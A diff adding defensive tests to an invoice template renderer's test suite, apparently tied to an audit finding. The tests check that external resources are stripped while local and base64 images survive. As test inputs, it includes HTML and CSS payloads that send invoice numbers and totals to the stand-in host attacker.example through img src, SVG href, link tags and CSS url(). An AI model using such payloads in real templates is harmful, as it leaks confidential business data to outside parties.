@@ -327,6 +327,52 @@ const eventAuditDom = new JSDOM(handlerResult);
 const foundButtons = eventAuditDom.window.document.querySelectorAll('button');
 assert(foundButtons.length === 1 && !foundButtons[0].hasAttribute('onclick'), 'DOM inspection confirms event handlers removed from element');
 
+// External Resource Loading & Invoice Data Disclosure Prevention (Finding 3)
+console.log('\n--- 5.0. Testing Resource Loading & Data Disclosure Prevention (Finding 3) ---');
+
+// 1. External HTTP/HTTPS image src with interpolated invoice data token
+const externalImgTemplate = '<img src="https://attacker.example/track?inv={{invoiceNumber}}" alt="Logo" />';
+const externalImgResult = renderInvoiceTemplate(externalImgTemplate, { invoiceNumber: 'INV-CONFIDENTIAL-001' });
+assert(!externalImgResult.includes('https://attacker.example'), 'External HTTPS img src is stripped to prevent data disclosure');
+assert(!externalImgResult.includes('INV-CONFIDENTIAL-001'), 'Sensitive invoice data is not leaked via external img src');
+
+// 2. Protocol-relative img src
+const protoRelImgTemplate = '<img src="//attacker.example/leak.png" alt="Tracker" />';
+const protoRelImgResult = renderInvoiceTemplate(protoRelImgTemplate, {});
+assert(!protoRelImgResult.includes('//attacker.example'), 'Protocol-relative img src is stripped');
+
+// 3. SVG subresource tags (<image>, <use>) with external href
+const svgResourceTemplate = '<svg><image href="https://attacker.example/leak.svg" /><use href="https://attacker.example/icon.svg#symbol" /></svg>';
+const svgResourceResult = renderInvoiceTemplate(svgResourceTemplate, {});
+assert(!svgResourceResult.includes('https://attacker.example'), 'External SVG image and use hrefs are stripped');
+
+// 4. <link> tag in HTML is forbidden completely
+const linkTagTemplate = '<link rel="stylesheet" href="https://attacker.example/style.css" /><div class="body">Content</div>';
+const linkTagResult = renderInvoiceTemplate(linkTagTemplate, {});
+assert(!linkTagResult.includes('<link'), '<link> tag is forbidden and stripped from HTML');
+
+// 5. External URL in CSS background-image inside <style>
+const cssExternalTemplate = '<style>.header { background-image: url("https://attacker.example/bg?total={{total}}"); color: #111; }</style><div class="header">Hello</div>';
+const cssExternalResult = renderInvoiceTemplate(cssExternalTemplate, { total: '5000' });
+assert(!cssExternalResult.includes('https://attacker.example'), 'External URL in stylesheet url() is stripped');
+assert(cssExternalResult.includes('color:#111'), 'Safe style property alongside stripped external URL is preserved');
+
+// 6. External URL in inline style attribute
+const inlineExternalTemplate = '<div style="background-image: url(\'https://attacker.example/track.png\'); padding: 10px;">Card</div>';
+const inlineExternalResult = renderInvoiceTemplate(inlineExternalTemplate, {});
+assert(!inlineExternalResult.includes('https://attacker.example'), 'External URL in inline style url() is stripped');
+assert(inlineExternalResult.includes('style="padding:10px"'), 'Safe inline declaration preserved when external URL stripped');
+
+// 7. Legitimate local relative image src is preserved
+const localImgTemplate = '<img src="/assets/images/logo.png" alt="Company Logo" />';
+const localImgResult = renderInvoiceTemplate(localImgTemplate, {});
+assert(localImgResult.includes('src="/assets/images/logo.png"'), 'Local relative img src is preserved');
+
+// 8. Legitimate safe base64 raster image src is preserved
+const base64ImgTemplate = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY44YAAAAASUVORK5CYII=" alt="Pixel" />';
+const base64ImgResult = renderInvoiceTemplate(base64ImgTemplate, {});
+assert(base64ImgResult.includes('src="data:image/png;base64,'), 'Safe base64 raster image data URI in img src is preserved');
+
 // =========================================================================
 // 5.1 CENTRALIZED DOMPURIFY CONFIGURATION & HOOK ARCHITECTURE TESTS
 // =========================================================================
